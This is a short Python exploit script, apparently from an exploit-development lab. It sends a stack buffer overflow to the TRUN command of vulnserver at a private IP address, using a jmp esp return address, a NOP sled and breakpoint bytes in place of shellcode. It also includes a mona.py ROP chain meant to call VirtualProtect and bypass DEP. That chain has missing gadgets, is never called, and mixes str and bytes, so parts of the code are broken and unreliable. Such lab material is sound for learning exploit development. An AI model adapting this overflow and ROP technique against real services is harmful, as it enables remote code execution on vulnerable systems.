from pwn import *

host = '192.168.0.244'
port = 9999

# Register setup for VirtualProtect() :
# --------------------------------------------
#  EAX = NOP (0x90909090)
#  ECX = lpOldProtect (ptr to W address)
#  EDX = NewProtect (0x40)
#  EBX = dwSize
#  ESP = lPAddress (automatic)
#  EBP = ReturnTo (ptr to jmp esp)
#  ESI = ptr to VirtualProtect()
#  EDI = ROP NOP (RETN)
#  --- alternative chain ---
#  EAX = ptr to &VirtualProtect()
#  ECX = lpOldProtect (ptr to W address)
#  EDX = NewProtect (0x40)
#  EBX = dwSize
#  ESP = lPAddress (automatic)
#  EBP = POP (skip 4 bytes)
#  ESI = ptr to JMP [EAX]
#  EDI = ROP NOP (RETN)
#  + place ptr to "jmp esp" on stack, below PUSHAD
# --------------------------------------------

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x625011f2,  # POP EBP # RETN [essfunc.dll] 
      0x625011c7,  # & jmp esp [essfunc.dll]
      0x625011c0,  # POP EBX # RETN [essfunc.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x625011e4,  # POP EDX # RETN [essfunc.dll] 
      0x00000040,  # 0x00000040-> edx
      0x6250120c,  # POP ECX # RETN [essfunc.dll] 
      0x00405f1c,  # &Writable location [vulnserver.exe]
      0x00402d2e,  # POP EDI # POP EBP # RETN [vulnserver.exe] 
      0x625011f1,  # RETN (ROP NOP) [essfunc.dll]
      0x41414141,  # Filler (compensate)
      0x625011b4,  # POP EAX # RETN [essfunc.dll] 
      0x90909090,  # nop
      0x00000000,  # [-] Unable to find pushad gadget
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

jmp_esp = 0x625011af
buf = b'TRUN .'
buf += b'A'*2006
buf += p32(jmp_esp)
buf += b'\x90'*20
buf += b'\xcc'*4

io = remote(host,port)

io.sendline(buf)
